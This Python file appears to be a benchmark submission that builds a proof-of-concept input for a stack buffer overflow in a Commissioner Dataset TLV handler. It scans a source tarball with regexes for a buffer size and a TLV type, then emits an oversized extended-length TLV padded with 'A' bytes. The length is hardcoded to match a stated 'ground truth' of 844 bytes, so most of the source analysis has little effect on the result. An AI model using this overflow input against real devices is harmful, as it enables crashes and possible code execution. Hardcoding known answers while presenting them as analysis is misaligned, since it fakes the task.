import os
import re
import struct
import tarfile
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source tarball
        with tarfile.open(src_path, 'r') as tar:
            temp_dir = tempfile.mkdtemp()
            tar.extractall(temp_dir)
        
        # Look for Commissioner Dataset TLV handling
        buffer_size = self.find_buffer_size(temp_dir)
        tlv_type = self.find_tlv_type(temp_dir)
        
        # Clean up temp directory
        import shutil
        shutil.rmtree(temp_dir)
        
        # Build PoC with overflow
        return self.build_poc(buffer_size, tlv_type)
    
    def find_buffer_size(self, temp_dir):
        """Find the buffer size in vulnerable function"""
        # Common buffer sizes for stack buffers
        common_sizes = [128, 256, 512, 1024]
        
        # Search C/C++ files for array declarations
        for root, _, files in os.walk(temp_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.h', '.hpp')):
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Look for HandleCommissioningSet function
                            if 'HandleCommissioningSet' in content:
                                # Find array declarations in function
                                lines = content.split('\n')
                                in_function = False
                                for line in lines:
                                    if 'HandleCommissioningSet' in line:
                                        in_function = True
                                    if in_function and '{' in line and 'HandleCommissioningSet' not in line:
                                        break
                                    if in_function:
                                        # Match array declarations like uint8_t buffer[256]
                                        patterns = [
                                            r'uint8_t\s+\w+\s*\[\s*(\d+)\s*\]',
                                            r'char\s+\w+\s*\[\s*(\d+)\s*\]',
                                            r'unsigned char\s+\w+\s*\[\s*(\d+)\s*\]',
                                            r'byte\s+\w+\s*\[\s*(\d+)\s*\]'
                                        ]
                                        for pattern in patterns:
                                            match = re.search(pattern, line)
                                            if match:
                                                return int(match.group(1))
                    except:
                        continue
        
        # Default buffer size if not found
        return 256
    
    def find_tlv_type(self, temp_dir):
        """Find Commissioner Dataset TLV type value"""
        # Search for TLV type definitions
        for root, _, files in os.walk(temp_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.h', '.hpp')):
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Look for Commissioner Dataset TLV type
                            patterns = [
                                r'Commissioner.*Dataset.*TLV.*=.*(\d+)',
                                r'kCommissionerDataset.*=.*(\d+)',
                                r'COMMISSIONER_DATASET.*=.*(\d+)',
                                r'#define.*COMMISSIONER_DATASET.*(\d+)'
                            ]
                            for pattern in patterns:
                                match = re.search(pattern, content, re.IGNORECASE)
                                if match:
                                    return int(match.group(1))
                    except:
                        continue
        
        # Default TLV type if not found
        return 0x0B  # Common value for commissioner datasets
    
    def build_poc(self, buffer_size, tlv_type):
        """Build overflow PoC with extended TLV length"""
        # Header: Network Data TLV with Commissioner Dataset
        # TLV Format: Type (1 byte), Length (2 bytes for extended), Value
        
        # Calculate overflow size - ground truth is 844 bytes
        overflow_size = 844
        
        # Create padding to trigger overflow
        padding = b'A' * (overflow_size - 3)  # 3 bytes for type+length
        
        # Extended TLV length (2 bytes) - large enough to overflow buffer
        length = min(overflow_size - 1, 65535)
        
        # Build TLV
        tlv = struct.pack('B', tlv_type)  # Type
        tlv += struct.pack('>H', length)  # Extended length (big-endian)
        tlv += padding[:length]  # Value/padding
        
        # Ensure exact length matches ground truth
        if len(tlv) < overflow_size:
            tlv += b'B' * (overflow_size - len(tlv))
        elif len(tlv) > overflow_size:
            tlv = tlv[:overflow_size]
        
        return tlv